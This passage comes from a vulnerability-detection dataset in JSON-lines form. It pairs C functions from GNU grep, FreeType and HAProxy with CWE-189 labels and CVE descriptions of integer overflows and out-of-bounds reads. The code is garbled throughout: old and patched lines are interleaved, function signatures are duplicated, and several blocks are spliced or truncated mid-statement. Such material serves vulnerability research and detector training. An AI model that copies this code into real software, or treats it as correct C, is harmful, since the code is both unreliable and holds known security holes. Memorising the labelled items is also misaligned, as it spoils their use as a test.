= print_line_middle (beg, lim, line_color, match_color);\n\n      /* FIXME: this test may be removable.  */\n      if (!only_matching && *line_color)\n        beg = print_line_tail (beg, lim, line_color);\n    }\n\n  if (!only_matching && lim > beg)\n    fwrite (beg, 1, lim - beg, stdout);\n\n  if (ferror (stdout))\n    {\n      write_error_seen = 1;\n      error (EXIT_TROUBLE, 0, _(\"write error\"));\n    }\n\n  lastout = lim;\n\n  if (line_buffered)\n    fflush (stdout);\n}\n\n/* Print pending lines of trailing context prior to LIM. Trailing context ends\n   at the next matching line when OUTLEFT is 0.  */\nstatic void\nprpending (char const *lim)\n{\n  if (!lastout)\n    lastout = bufbeg;\n  while (pending > 0 && lastout < lim)\n    {\n      char const *nl = memchr (lastout, eolbyte, lim - lastout);\n      size_t match_size;\n      --pending;\n      if (outleft\n          || ((execute (lastout, nl + 1 - lastout,\n                        &match_size, NULL) == (size_t) -1)\n              == !out_invert))\n        prline (lastout, nl + 1, SEP_CHAR_REJECTED);\n      else\n        pending = 0;\n    }\n}\n\n/* Print the lines between BEG and LIM.  Deal with context crap.\n   If NLINESP is non-null, store a count of lines between BEG and LIM.  */\nstatic void\nprtext (char const *beg, char const *lim, int *nlinesp)\n{\n /* Print the lines between BEG and LIM.  Deal with context crap.\n    If NLINESP is non-null, store a count of lines between BEG and LIM.  */\n static void\nprtext (char const *beg, char const *lim, intmax_t *nlinesp)\n {\n   static int used;\t/* avoid printing SEP_STR_GROUP before any output */\n   char const *bp, *p;\n   char eol = eolbyte;\n  intmax_t i, n;\n \n   if (!out_quiet && pending > 0)\n     prpending (beg);\n      /* Deal with leading context crap. */\n\n      bp = lastout ? lastout : bufbeg;\n      for (i = 0; i < out_before; ++i)\n        if (p > bp)\n          do\n            --p;\n          while (p[-1] != eol);\n\n      /* We print the SEP_STR_GROUP separator only if our output is\n         discontiguous from the last output in the file. */\n      if ((out_before || out_after) && used && p != lastout && group_separator)\n        {\n          pr_sgr_start_if (sep_color);\n          fputs (group_separator, stdout);\n          pr_sgr_end_if (sep_color);\n          fputc ('\\n', stdout);\n        }\n\n      while (p < beg)\n        {\n          char const *nl = memchr (p, eol, beg - p);\n          nl++;\n          prline (p, nl, SEP_CHAR_REJECTED);\n          p = nl;\n        }\n    }\n\n  if (nlinesp)\n    {\n      /* Caller wants a line count. */\n      for (n = 0; p < lim && n < outleft; n++)\n        {\n          char const *nl = memchr (p, eol, lim - p);\n          nl++;\n          if (!out_quiet)\n            prline (p, nl, SEP_CHAR_SELECTED);\n          p = nl;\n        }\n      *nlinesp = n;\n\n      /* relying on it that this function is never called when outleft = 0.  */\n      after_last_match = bufoffset - (buflim - p);\n    }\n  else if (!out_quiet)\n    prline (beg, lim, SEP_CHAR_SELECTED);\n\n  pending = out_quiet ? 0 : out_after;\n  used = 1;\n}\n\nstatic size_t\ndo_execute (char const *buf, size_t size, size_t *match_size, char const *start_ptr)\n{\n  size_t result;\n  const char *line_next;\n\n  /* With the current implementation, using --ignore-case with a multi-byte\n     character set is very inefficient when applied to a large buffer\n     containing many matches.  We can avoid much of the wasted effort\n     by matching line-by-line.\n\n     FIXME: this is just an ugly workaround, and it doesn't really\n     belong here.  Also, PCRE is always using this same per-line\n     matching algorithm.  Either we fix -i, or we should refactor\n     this code---for example, we could add another function pointer\n     to struct matcher to split the buffer passed to execute.  It would\n     perform the memchr if line-by-line matching is necessary, or just\n     return buf + size otherwise.  */\n  if (MB_CUR_MAX == 1 || !match_icase)\n    return execute (buf, size, match_size, start_ptr);\n\n  for (line_next = buf; line_next < buf + size; )\n    {\n      const char *line_buf = line_next;\n      const char *line_end = memchr (line_buf, eolbyte, (buf + size) - line_buf);\n      if (line_end == NULL)\n        line_next = line_end = buf + size;\n      else\n        line_next = line_end + 1;\n\n      if (start_ptr && start_ptr >= line_end)\n        continue;\n\n      result = execute (line_buf, line_next - line_buf, match_size, start_ptr);\n      if (result != (size_t) -1)\n        return (line_buf - buf) + result;\n    }\n\n  return (size_t) -1;\n}\n\n/* Scan the specified portion of the buffer, matching lines (or\n   between matching lines if OUT_INVERT is true).  Return a count of\n   lines printed. */\nstatic int\ngrepbuf (char const *beg, char const *lim)\n /* Scan the specified portion of the buffer, matching lines (or\n    between matching lines if OUT_INVERT is true).  Return a count of\n    lines printed. */\nstatic intmax_t\n grepbuf (char const *beg, char const *lim)\n {\n  intmax_t nlines, n;\n   char const *p;\n   size_t match_offset;\n   size_t match_size;\n    {\n      char const *b = p + match_offset;\n      char const *endp = b + match_size;\n      /* Avoid matching the empty line at the end of the buffer. */\n      if (b == lim)\n        break;\n      if (!out_invert)\n        {\n          prtext (b, endp, (int *) 0);\n          nlines++;\n         break;\n       if (!out_invert)\n         {\n          prtext (b, endp, NULL);\n           nlines++;\n           outleft--;\n           if (!outleft || done_on_match)\n            }\n        }\n      else if (p < b)\n        {\n          prtext (p, b, &n);\n          nlines += n;\n          outleft -= n;\n          if (!outleft)\n            return nlines;\n        }\n      p = endp;\n    }\n  if (out_invert && p < lim)\n    {\n      prtext (p, lim, &n);\n      nlines += n;\n      outleft -= n;\n    }\n  return nlines;\n}\n\n/* Search a given file.  Normally, return a count of lines printed;\n   but if the file is a directory and we search it recursively, then\n   return -2 if there was a match, and -1 otherwise.  */\nstatic int\ngrep (int fd, char const *file, struct stats *stats)\n /* Search a given file.  Normally, return a count of lines printed;\n    but if the file is a directory and we search it recursively, then\n    return -2 if there was a match, and -1 otherwise.  */\nstatic intmax_t\n grep (int fd, char const *file, struct stats *stats)\n {\n  intmax_t nlines, i;\n   int not_text;\n   size_t residue, save;\n   char oldc;\n    return 0;\n\n  if (file && directories == RECURSE_DIRECTORIES\n      && S_ISDIR (stats->stat.st_mode))\n    {\n      /* Close fd now, so that we don't open a lot of file descriptors\n         when we recurse deeply.  */\n      if (close (fd) != 0)\n        suppressible_error (file, errno);\n      return grepdir (file, stats) - 2;\n    }\n\n  totalcc = 0;\n  lastout = 0;\n  totalnl = 0;\n  outleft = max_count;\n  after_last_match = 0;\n  pending = 0;\n\n  nlines = 0;\n  residue = 0;\n  save = 0;\n\n  if (! fillbuf (save, stats))\n    {\n      suppressible_error (filename, errno);\n      return 0;\n    }\n\n  not_text = (((binary_files == BINARY_BINARY_FILES && !out_quiet)\n               || binary_files == WITHOUT_MATCH_BINARY_FILES)\n              && memchr (bufbeg, eol ? '\\0' : '\\200', buflim - bufbeg));\n  if (not_text && binary_files == WITHOUT_MATCH_BINARY_FILES)\n    return 0;\n  done_on_match += not_text;\n  out_quiet += not_text;\n\n  for (;;)\n    {\n      lastnl = bufbeg;\n      if (lastout)\n        lastout = bufbeg;\n\n      beg = bufbeg + save;\n\n      /* no more data to scan (eof) except for maybe a residue -> break */\n      if (beg == buflim)\n        break;\n\n      /* Determine new residue (the length of an incomplete line at the end of\n         the buffer, 0 means there is no incomplete last line).  */\n      oldc = beg[-1];\n      beg[-1] = eol;\n      for (lim = buflim; lim[-1] != eol; lim--)\n        continue;\n      beg[-1] = oldc;\n      if (lim == beg)\n        lim = beg - residue;\n      beg -= residue;\n      residue = buflim - lim;\n\n      if (beg < lim)\n        {\n          if (outleft)\n            nlines += grepbuf (beg, lim);\n          if (pending)\n            prpending (lim);\n          if ((!outleft && !pending) || (nlines && done_on_match && !out_invert))\n            goto finish_grep;\n        }\n\n      /* The last OUT_BEFORE lines at the end of the buffer will be needed as\n         leading context if there is a matching line at the begin of the\n         next data. Make beg point to their begin.  */\n      i = 0;\n      beg = lim;\n      while (i < out_before && beg > bufbeg && beg != lastout)\n        {\n          ++i;\n          do\n            --beg;\n          while (beg[-1] != eol);\n        }\n\n      /* detect if leading context is discontinuous from last printed line.  */\n      if (beg != lastout)\n        lastout = 0;\n\n      /* Handle some details and read more data to scan.  */\n      save = residue + lim - beg;\n      if (out_byte)\n        totalcc = add_count (totalcc, buflim - bufbeg - save);\n      if (out_line)\n        nlscan (beg);\n      if (! fillbuf (save, stats))\n        {\n          suppressible_error (filename, errno);\n          goto finish_grep;\n        }\n    }\n  if (residue)\n    {\n      *buflim++ = eol;\n      if (outleft)\n        nlines += grepbuf (bufbeg + save - residue, buflim);\n      if (pending)\n        prpending (buflim);\n    }\n\n finish_grep:\n  done_on_match -= not_text;\n  out_quiet -= not_text;\n  if ((not_text & ~out_quiet) && nlines != 0)\n    printf (_(\"Binary file %s matches\\n\"), filename);\n  return nlines;\n}\n\nstatic int\ngrepfile (char const *file, struct stats *stats)\n{\n  int desc;\n  int count;\n  int status;\n grepfile (char const *file, struct stats *stats)\n {\n   int desc;\n  intmax_t count;\n   int status;\n \n   filename = (file ? file : label ? label : _(\"(standard input)\"));\n      /* Don't open yet, since that might have side effects on a device.  */\n      desc = -1;\n    }\n  else\n    {\n      /* When skipping directories, don't worry about directories\n         that can't be opened.  */\n      desc = open (file, O_RDONLY);\n      if (desc < 0 && directories != SKIP_DIRECTORIES)\n        {\n          suppressible_error (file, errno);\n          return 1;\n        }\n    }\n\n  if (desc < 0\n      ? stat (file, &stats->stat) != 0\n      : fstat (desc, &stats->stat) != 0)\n    {\n      suppressible_error (filename, errno);\n      if (file)\n        close (desc);\n      return 1;\n    }\n\n  if ((directories == SKIP_DIRECTORIES && S_ISDIR (stats->stat.st_mode))\n      || (devices == SKIP_DEVICES && (S_ISCHR (stats->stat.st_mode)\n                                      || S_ISBLK (stats->stat.st_mode)\n                                      || S_ISSOCK (stats->stat.st_mode)\n                                      || S_ISFIFO (stats->stat.st_mode))))\n    {\n      if (file)\n        close (desc);\n      return 1;\n    }\n\n  /* If there is a regular file on stdout and the current file refers\n     to the same i-node, we have to report the problem and skip it.\n     Otherwise when matching lines from some other input reach the\n     disk before we open this file, we can end up reading and matching\n     those lines and appending them to the file from which we're reading.\n     Then we'd have what appears to be an infinite loop that'd terminate\n     only upon filling the output file system or reaching a quota.\n     However, there is no risk of an infinite loop if grep is generating\n     no output, i.e., with --silent, --quiet, -q.\n     Similarly, with any of these:\n       --max-count=N (-m) (for N >= 2)\n       --files-with-matches (-l)\n       --files-without-match (-L)\n     there is no risk of trouble.\n     For --max-count=1, grep stops after printing the first match,\n     so there is no risk of malfunction.  But even --max-count=2, with\n     input==output, while there is no risk of infloop, there is a race\n     condition that could result in \"alternate\" output.  */\n  if (!out_quiet && list_files == 0 && 1 < max_count\n      && S_ISREG (out_stat.st_mode) && out_stat.st_ino\n      && SAME_INODE (stats->stat, out_stat))\n    {\n      if (! suppress_errors)\n        error (0, 0, _(\"input file %s is also the output\"), quote (filename));\n      errseen = 1;\n      if (file)\n        close (desc);\n      return 1;\n    }\n\n  if (desc < 0)\n    {\n      desc = open (file, O_RDONLY);\n      if (desc < 0)\n        {\n          suppressible_error (file, errno);\n          return 1;\n        }\n    }\n\n#if defined SET_BINARY\n  /* Set input to binary mode.  Pipes are simulated with files\n     on DOS, so this includes the case of \"foo | grep bar\".  */\n  if (!isatty (desc))\n    SET_BINARY (desc);\n#endif\n\n  count = grep (desc, file, stats);\n  if (count < 0)\n    status = count + 2;\n  else\n    {\n      if (count_matches)\n        {\n          if (out_file)\n            {\n              print_filename ();\n              if (filename_mask)\n                print_sep (SEP_CHAR_SELECTED);\n              else\n                fputc (0, stdout);\n            }\n          printf (\"%d\\n\", count);\n        }\n               else\n                 fputc (0, stdout);\n             }\n          printf (\"%\" PRIdMAX \"\\n\", count);\n         }\n \n       status = !count;\n\n      if (! file)\n        {\n          off_t required_offset = outleft ? bufoffset : after_last_match;\n          if (required_offset != bufoffset\n              && lseek (desc, required_offset, SEEK_SET) < 0\n              && S_ISREG (stats->stat.st_mode))\n            suppressible_error (filename, errno);\n        }\n      else\n        while (close (desc) != 0)\n          if (errno != EINTR)\n            {\n              suppressible_error (file, errno);\n              break;\n            }\n    }\n", "func_hash": 46085918764084639984457622752978355870, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2012-5667", "cve_desc": "Multiple integer overflows in GNU Grep before 2.11 might allow context-dependent attackers to execute arbitrary code via vectors involving a long input line that triggers a heap-based buffer overflow.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-5667"}
{"idx": 158041, "project": "savannah", "commit_id": "ef1eba75187adfac750f326b563fe543dd5ff4e6", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=ef1eba75187adfac750f326b563fe543dd5ff4e6", "commit_message": "None", "target": 0, "func": "  pcf_get_encodings( FT_Stream  stream,\n                     PCF_Face   face )\n  {\n    FT_Error      error;\n    FT_Memory     memory = FT_FACE( face )->memory;\n    FT_ULong      format, size;\n    int           firstCol, lastCol;\n    int           firstRow, lastRow;\n    int           nencoding, encodingOffset;\n    int           i, j, k;\n    PCF_Encoding  encoding = NULL;\n\n\n    error = pcf_seek_to_table_type( stream,\n                                    face->toc.tables,\n                                    face->toc.count,\n                                    PCF_BDF_ENCODINGS,\n                                    &format,\n                                    &size );\n    if ( error )\n      return error;\n\n    error = FT_Stream_EnterFrame( stream, 14 );\n    if ( error )\n      return error;\n\n    format = FT_GET_ULONG_LE();\n\n    if ( PCF_BYTE_ORDER( format ) == MSBFirst )\n    {\n      firstCol          = FT_GET_SHORT();\n      lastCol           = FT_GET_SHORT();\n      firstRow          = FT_GET_SHORT();\n      lastRow           = FT_GET_SHORT();\n      face->defaultChar = FT_GET_SHORT();\n    }\n    else\n    {\n      firstCol          = FT_GET_SHORT_LE();\n      lastCol           = FT_GET_SHORT_LE();\n      firstRow          = FT_GET_SHORT_LE();\n      lastRow           = FT_GET_SHORT_LE();\n      face->defaultChar = FT_GET_SHORT_LE();\n    }\n\n    FT_Stream_ExitFrame( stream );\n\n     if ( !PCF_FORMAT_MATCH( format, PCF_DEFAULT_FORMAT ) )\n       return FT_THROW( Invalid_File_Format );\n \n    /* sanity checks */\n    if ( firstCol < 0       ||\n         firstCol > lastCol ||\n         lastCol  > 0xFF    ||\n         firstRow < 0       ||\n         firstRow > lastRow ||\n         lastRow  > 0xFF    )\n      return FT_THROW( Invalid_Table );\n\n     FT_TRACE4(( \"pdf_get_encodings:\\n\" ));\n \n     FT_TRACE4(( \"  firstCol %d, lastCol %d, firstRow %d, lastRow %d\\n\",\n      goto Bail;\n\n    k = 0;\n    for ( i = firstRow; i <= lastRow; i++ )\n    {\n      for ( j = firstCol; j <= lastCol; j++ )\n      {\n        if ( PCF_BYTE_ORDER( format ) == MSBFirst )\n          encodingOffset = FT_GET_SHORT();\n        else\n          encodingOffset = FT_GET_SHORT_LE();\n\n        if ( encodingOffset != -1 )\n        {\n          encoding[k].enc   = i * 256 + j;\n          encoding[k].glyph = (FT_Short)encodingOffset;\n\n          FT_TRACE5(( \"  code %d (0x%04X): idx %d\\n\",\n                      encoding[k].enc, encoding[k].enc, encoding[k].glyph ));\n\n          k++;\n        }\n      }\n    }\n    FT_Stream_ExitFrame( stream );\n\n    if ( FT_RENEW_ARRAY( encoding, nencoding, k ) )\n      goto Bail;\n\n    face->nencodings = k;\n    face->encodings  = encoding;\n\n    return error;\n\n  Bail:\n    FT_FREE( encoding );\n    return error;\n  }\n", "func_hash": 65067616049209972384721953510505056376, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-9670", "cve_desc": "Multiple integer signedness errors in the pcf_get_encodings function in pcf/pcfread.c in FreeType before 2.5.4 allow remote attackers to cause a denial of service (integer overflow, NULL pointer dereference, and application crash) via a crafted PCF file that specifies negative values for the first column and first row.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-9670"}
{"idx": 158043, "project": "savannah", "commit_id": "257c270bd25e15890190a28a1456e7623bba4439", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=257c270bd25e15890190a28a1456e7623bba4439", "commit_message": "None", "target": 0, "func": "  tt_sbit_decoder_init( TT_SBitDecoder       decoder,\n                        TT_Face              face,\n                        FT_ULong             strike_index,\n                        TT_SBit_MetricsRec*  metrics )\n  {\n    FT_Error   error;\n    FT_Stream  stream = face->root.stream;\n    FT_ULong   ebdt_size;\n\n\n    error = face->goto_table( face, TTAG_CBDT, stream, &ebdt_size );\n    if ( error )\n      error = face->goto_table( face, TTAG_EBDT, stream, &ebdt_size );\n    if ( error )\n      error = face->goto_table( face, TTAG_bdat, stream, &ebdt_size );\n    if ( error )\n      goto Exit;\n\n    decoder->face    = face;\n    decoder->stream  = stream;\n    decoder->bitmap  = &face->root.glyph->bitmap;\n    decoder->metrics = metrics;\n\n    decoder->metrics_loaded   = 0;\n    decoder->bitmap_allocated = 0;\n\n    decoder->ebdt_start = FT_STREAM_POS();\n    decoder->ebdt_size  = ebdt_size;\n\n    decoder->eblc_base  = face->sbit_table;\n    decoder->eblc_limit = face->sbit_table + face->sbit_table_size;\n\n    /* now find the strike corresponding to the index */\n    {\n      FT_Byte*  p;\n\n\n      if ( 8 + 48 * strike_index + 3 * 4 + 34 + 1 > face->sbit_table_size )\n      {\n        error = FT_THROW( Invalid_File_Format );\n        goto Exit;\n      }\n\n      p = decoder->eblc_base + 8 + 48 * strike_index;\n\n      decoder->strike_index_array = FT_NEXT_ULONG( p );\n      p                          += 4;\n      decoder->strike_index_count = FT_NEXT_ULONG( p );\n       p                          += 34;\n       decoder->bit_depth          = *p;\n \n      /* decoder->strike_index_array +                               */\n      /*   8 * decoder->strike_index_count > face->sbit_table_size ? */\n      if ( decoder->strike_index_array > face->sbit_table_size           ||\n           decoder->strike_index_count >\n             ( face->sbit_table_size - decoder->strike_index_array ) / 8 )\n         error = FT_THROW( Invalid_File_Format );\n     }\n  }\n", "func_hash": 318862796718235578447679874450835905734, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-9666", "cve_desc": "The tt_sbit_decoder_init function in sfnt/ttsbit.c in FreeType before 2.5.4 proceeds with a count-to-size association without restricting the count value, which allows remote attackers to cause a denial of service (integer overflow and out-of-bounds read) or possibly have unspecified other impact via a crafted embedded bitmap.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-9666"}
{"idx": 158115, "project": "haproxy", "commit_id": "b4d05093bc89f71377230228007e69a1434c1a0c", "project_url": "https://github.com/haproxy/haproxy", "commit_url": "https://git.haproxy.org/?p=haproxy-1.5.git;a=commitdiff;h=b4d05093bc89f71377230228007e69a1434c1a0c", "commit_message": "None", "target": 0, "func": "int http_request_forward_body(struct session *s, struct channel *req, int an_bit)\n{\n\tstruct http_txn *txn = &s->txn;\n\tstruct http_msg *msg = &s->txn.req;\n\n\tif (unlikely(msg->msg_state < HTTP_MSG_BODY))\n\t\treturn 0;\n\n\tif ((req->flags & (CF_READ_ERROR|CF_READ_TIMEOUT|CF_WRITE_ERROR|CF_WRITE_TIMEOUT)) ||\n\t    ((req->flags & CF_SHUTW) && (req->to_forward || req->buf->o))) {\n\t\t/* Output closed while we were sending data. We must abort and\n\t\t * wake the other side up.\n\t\t */\n\t\tmsg->msg_state = HTTP_MSG_ERROR;\n\t\thttp_resync_states(s);\n\t\treturn 1;\n\t}\n\n\t/* Note that we don't have to send 100-continue back because we don't\n\t * need the data to complete our job, and it's up to the server to\n\t * decide whether to return 100, 417 or anything else in return of\n\t * an \"Expect: 100-continue\" header.\n\t */\n\n\tif (msg->sov > 0) {\n\t\t/* we have msg->sov which points to the first byte of message\n\t\t * body, and req->buf.p still points to the beginning of the\n\t\t * message. We forward the headers now, as we don't need them\n\t\t * anymore, and we want to flush them.\n\t\t */\n\t\tb_adv(req->buf, msg->sov);\n\t\tmsg->next -= msg->sov;\n\t\tmsg->sov = 0;\n\n\t\t/* The previous analysers guarantee that the state is somewhere\n\t\t * between MSG_BODY and the first MSG_DATA. So msg->sol and\n\t\t * msg->next are always correct.\n\t\t */\n\t\tif (msg->msg_state < HTTP_MSG_CHUNK_SIZE) {\n\t\t\tif (msg->flags & HTTP_MSGF_TE_CHNK)\n\t\t\t\tmsg->msg_state = HTTP_MSG_CHUNK_SIZE;\n\t\t\telse\n\t\t\t\tmsg->msg_state = HTTP_MSG_DATA;\n\t\t}\n\t}\n\n\t/* Some post-connect processing might want us to refrain from starting to\n\t * forward data. Currently, the only reason for this is \"balance url_param\"\n\t * whichs need to parse/process the request after we've enabled forwarding.\n\t */\n\tif (unlikely(msg->flags & HTTP_MSGF_WAIT_CONN)) {\n\t\tif (!(s->rep->flags & CF_READ_ATTACHED)) {\n\t\t\tchannel_auto_connect(req);\n\t\t\treq->flags |= CF_WAKE_CONNECT;\n\t\t\tgoto missing_data;\n\t\t}\n\t\tmsg->flags &= ~HTTP_MSGF_WAIT_CONN;\n\t}\n\n\t/* in most states, we should abort in case of early close */\n\tchannel_auto_close(req);\n\n\tif (req->to_forward) {\n\t\t/* We can't process the buffer's contents yet */\n\t\treq->flags |= CF_WAKE_WRITE;\n\t\tgoto missing_data;\n\t}\n\n\twhile (1) {\n\t\tif (msg->msg_state == HTTP_MSG_DATA) {\n\t\t\t/* must still forward */\n\t\t\t/* we may have some pending data starting at req->buf->p */\n\t\t\tif (msg->chunk_len > req->buf->i - msg->next) {\n\t\t\t\treq->flags |= CF_WAKE_WRITE;\n\t\t\t\tgoto missing_data;\n\t\t\t}\n\t\t\tmsg->next += msg->chunk_len;\n\t\t\tmsg->chunk_len = 0;\n\n\t\t\t/* nothing left to forward */\n\t\t\tif (msg->flags & HTTP_MSGF_TE_CHNK)\n\t\t\t\tmsg->msg_state = HTTP_MSG_CHUNK_CRLF;\n\t\t\telse\n\t\t\t\tmsg->msg_state = HTTP_MSG_DONE;\n\t\t}\n\t\telse if (msg->msg_state == HTTP_MSG_CHUNK_SIZE) {\n\t\t\t/* read the chunk size and assign it to ->chunk_len, then\n\t\t\t * set ->next to point to the body and switch to DATA or\n\t\t\t * TRAILERS state.\n\t\t\t */\n\t\t\tint ret = http_parse_chunk_size(msg);\n\n\t\t\tif (ret == 0)\n\t\t\t\tgoto missing_data;\n\t\t\telse if (ret < 0) {\n\t\t\t\tsession_inc_http_err_ctr(s);\n\t\t\t\tif (msg->err_pos >= 0)\n\t\t\t\t\thttp_capture_bad_message(&s->fe->invalid_req, s, msg, HTTP_MSG_CHUNK_SIZE, s->be);\n\t\t\t\tgoto return_bad_req;\n\t\t\t}\n\t\t\t/* otherwise we're in HTTP_MSG_DATA or HTTP_MSG_TRAILERS state */\n\t\t}\n\t\telse if (msg->msg_state == HTTP_MSG_CHUNK_CRLF) {\n\t\t\t/* we want the CRLF after the data */\n\t\t\tint ret = http_skip_chunk_crlf(msg);\n\n\t\t\tif (ret == 0)\n\t\t\t\tgoto missing_data;\n\t\t\telse if (ret < 0) {\n\t\t\t\tsession_inc_http_err_ctr(s);\n\t\t\t\tif (msg->err_pos >= 0)\n\t\t\t\t\thttp_capture_bad_message(&s->fe->invalid_req, s, msg, HTTP_MSG_CHUNK_CRLF, s->be);\n\t\t\t\tgoto return_bad_req;\n\t\t\t}\n\t\t\t/* we're in MSG_CHUNK_SIZE now */\n\t\t}\n\t\telse if (msg->msg_state == HTTP_MSG_TRAILERS) {\n\t\t\tint ret = http_forward_trailers(msg);\n\n\t\t\tif (ret == 0)\n\t\t\t\tgoto missing_data;\n\t\t\telse if (ret < 0) {\n\t\t\t\tsession_inc_http_err_ctr(s);\n\t\t\t\tif (msg->err_pos >= 0)\n\t\t\t\t\thttp_capture_bad_message(&s->fe->invalid_req, s, msg, HTTP_MSG_TRAILERS, s->be);\n\t\t\t\tgoto return_bad_req;\n\t\t\t}\n\t\t\t/* we're in HTTP_MSG_DONE now */\n\t\t}\n\t\telse {\n\t\t\tint old_state = msg->msg_state;\n\n\t\t\t/* other states, DONE...TUNNEL */\n\n\t\t\t/* we may have some pending data starting at req->buf->p\n                         * such as last chunk of data or trailers.\n                         */\n                        b_adv(req->buf, msg->next);\n                       if (unlikely(!(s->req->flags & CF_WROTE_DATA)))\n                                msg->sov -= msg->next;\n                        msg->next = 0;\n \n\t\t\t/* for keep-alive we don't want to forward closes on DONE */\n\t\t\tif ((txn->flags & TX_CON_WANT_MSK) == TX_CON_WANT_KAL ||\n\t\t\t    (txn->flags & TX_CON_WANT_MSK) == TX_CON_WANT_SCL)\n\t\t\t\tchannel_dont_close(req);\n\t\t\tif (http_resync_states(s)) {\n\t\t\t\t/* some state changes occurred, maybe the analyser\n\t\t\t\t * was disabled too.\n\t\t\t\t */\n\t\t\t\tif (unlikely(msg->msg_state == HTTP_MSG_ERROR)) {\n\t\t\t\t\tif (req->flags & CF_SHUTW) {\n\t\t\t\t\t\t/* request errors are most likely due to\n\t\t\t\t\t\t * the server aborting the transfer.\n\t\t\t\t\t\t */\n\t\t\t\t\t\tgoto aborted_xfer;\n\t\t\t\t\t}\n\t\t\t\t\tif (msg->err_pos >= 0)\n\t\t\t\t\t\thttp_capture_bad_message(&s->fe->invalid_req, s, msg, old_state, s->be);\n\t\t\t\t\tgoto return_bad_req;\n\t\t\t\t}\n\t\t\t\treturn 1;\n\t\t\t}\n\n\t\t\t/* If \"option abortonclose\" is set on the backend, we\n\t\t\t * want to monitor the client's connection and forward\n\t\t\t * any shutdown notification to the server, which will\n\t\t\t * decide whether to close or to go on processing the\n\t\t\t * request.\n\t\t\t */\n\t\t\tif (s->be->options & PR_O_ABRT_CLOSE) {\n\t\t\t\tchannel_auto_read(req);\n\t\t\t\tchannel_auto_close(req);\n\t\t\t}\n\t\t\telse if (s->txn.meth == HTTP_METH_POST) {\n\t\t\t\t/* POST requests may require to read extra CRLF\n\t\t\t\t * sent by broken browsers and which could cause\n\t\t\t\t * an RST to be sent upon close on some systems\n\t\t\t\t * (eg: Linux).\n\t\t\t\t */\n\t\t\t\tchannel_auto_read(req);\n\t\t\t}\n\n\t\t\treturn 0;\n\t\t}\n\t}\n\n  missing_data:\n        /* we may have some pending data starting at req->buf->p */\n        b_adv(req->buf, msg->next);\n       if (unlikely(!(s->req->flags & CF_WROTE_DATA)))\n                msg->sov -= msg->next + MIN(msg->chunk_len, req->buf->i);\n \n        msg->next = 0;\n\tmsg->chunk_len -= channel_forward(req, msg->chunk_len);\n\n\t/* stop waiting for data if the input is closed before the end */\n\tif (req->flags & CF_SHUTR) {\n\t\tif (!(s->flags & SN_ERR_MASK))\n\t\t\ts->flags |= SN_ERR_CLICL;\n\t\tif (!(s->flags & SN_FINST_MASK)) {\n\t\t\tif (txn->rsp.msg_state < HTTP_MSG_ERROR)\n\t\t\t\ts->flags |= SN_FINST_H;\n\t\t\telse\n\t\t\t\ts->flags |= SN_FINST_D;\n\t\t}\n\n\t\ts->fe->fe_counters.cli_aborts++;\n\t\ts->be->be_counters.cli_aborts++;\n\t\tif (objt_server(s->target))\n\t\t\tobjt_server(s->target)->counters.cli_aborts++;\n\n\t\tgoto return_bad_req_stats_ok;\n\t}\n\n\t/* waiting for the last bits to leave the buffer */\n\tif (req->flags & CF_SHUTW)\n\t\tgoto aborted_xfer;\n\n\t/* When TE: chunked is used, we need to get there again to parse remaining\n\t * chunks even if the client has closed, so we don't want to set CF_DONTCLOSE.\n\t */\n\tif (msg->flags & HTTP_MSGF_TE_CHNK)\n\t\tchannel_dont_close(req);\n\n\t/* We know that more data are expected, but we couldn't send more that\n\t * what we did. So we always set the CF_EXPECT_MORE flag so that the\n\t * system knows it must not set a PUSH on this first part. Interactive\n\t * modes are already handled by the stream sock layer. We must not do\n\t * this in content-length mode because it could present the MSG_MORE\n\t * flag with the last block of forwarded data, which would cause an\n\t * additional delay to be observed by the receiver.\n\t */\n\tif (msg->flags & HTTP_MSGF_TE_CHNK)\n\t\treq->flags |= CF_EXPECT_MORE;\n\n\treturn 0;\n\n return_bad_req: /* let's centralize all bad requests */\n\ts->fe->fe_counters.failed_req++;\n\tif (s->listener->counters)\n\t\ts->listener->counters->failed_req++;\n\n return_bad_req_stats_ok:\n\t/* we may have some pending data starting at req->buf->p */\n\tb_adv(req->buf, msg->next);\n\tmsg->next = 0;\n\n\ttxn->req.msg_state = HTTP_MSG_ERROR;\n\tif (txn->status) {\n\t\t/* Note: we don't send any error if some data were already sent */\n\t\tstream_int_retnclose(req->prod, NULL);\n\t} else {\n\t\ttxn->status = 400;\n\t\tstream_int_retnclose(req->prod, http_error_message(s, HTTP_ERR_400));\n\t}\n\treq->analysers = 0;\n\ts->rep->analysers = 0; /* we're in data phase, we want to abort both directions */\n\n\tif (!(s->flags & SN_ERR_MASK))\n\t\ts->flags |= SN_ERR_PRXCOND;\n\tif (!(s->flags & SN_FINST_MASK)) {\n\t\tif (txn->rsp.msg_state < HTTP_MSG_ERROR)\n\t\t\ts->flags |= SN_FINST_H;\n\t\telse\n\t\t\ts->flags |= SN_FINST_D;\n\t}\n\treturn 0;\n\n aborted_xfer:\n\ttxn->req.msg_state = HTTP_MSG_ERROR;\n\tif (txn->status) {\n\t\t/* Note: we don't send any error if some data were already sent */\n\t\tstream_int_retnclose(req->prod, NULL);\n\t} else {\n\t\ttxn->status = 502;\n\t\tstream_int_retnclose(req->prod, http_error_message(s, HTTP_ERR_502));\n\t}\n\treq->analysers = 0;\n\ts->rep->analysers = 0; /* we're in data phase, we want to abort both directions */\n\n\ts->fe->fe_counters.srv_aborts++;\n\ts->be->be_counters.srv_aborts++;\n\tif (objt_server(s->target))\n\t\tobjt_server(s->target)->counters.srv_aborts++;\n\n\tif (!(s->flags & SN_ERR_MASK))\n\t\ts->flags |= SN_ERR_SRVCL;\n\tif (!(s->flags & SN_FINST_MASK)) {\n\t\tif (txn->rsp.msg_state < HTTP_MSG_ERROR)\n\t\t\ts->flags |= SN_FINST_H;\n\t\telse\n\t\t\ts->flags |= SN_FINST_D;\n\t}\n\treturn 0;\n}\n", "func_hash": 232911459327632823261392605236293767883, 